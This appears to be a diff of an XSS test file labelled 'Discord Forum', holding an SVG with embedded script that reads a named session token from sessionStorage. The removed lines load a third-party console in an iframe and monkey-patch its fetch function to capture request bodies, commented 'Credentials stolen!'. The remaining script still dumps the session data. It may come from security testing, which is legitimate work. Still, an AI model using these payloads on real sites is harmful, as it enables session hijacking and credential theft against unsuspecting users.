@@ -1,29 +1,8 @@
 # Discord Forum
 
-<iframe src='https://console.choreo.dev/' id='xss'></iframe>
 <svg>
   <script type="text/javascript">
     console.log(sessionStorage.getItem("session_data-instance_0-aVKhTSUMu_QfEwmCtrcuWoLy92oa"))
-    alert("here");
-    const iframe = document.getElementById('xss');
-    console.log("here")
-    iframe.addEventListener('load', () => {
-      try {
-        const iframeWindow = iframe.contentWindow;
-        const originalFetch = iframeWindow.fetch.bind(iframeWindow);
-        if (iframeWindow) {
-          console.log("wdwdw")
-        }
-        // Monkey-patching the fetch API to intercept credentials
-        iframeWindow.fetch = async function(url, options) {
-          console.log('Intercepted:', url, options);
-          console.log(options.body); // Credentials stolen!
-          return originalFetch(url, options);
-        };
-      } catch (e) {
-        console.error(e);
-      }
-    });
     console.log(sessionStorage.getItem("session_data-instance_0-aVKhTSUMu_QfEwmCtrcuWoLy92oa"))
   </script>
 </svg>
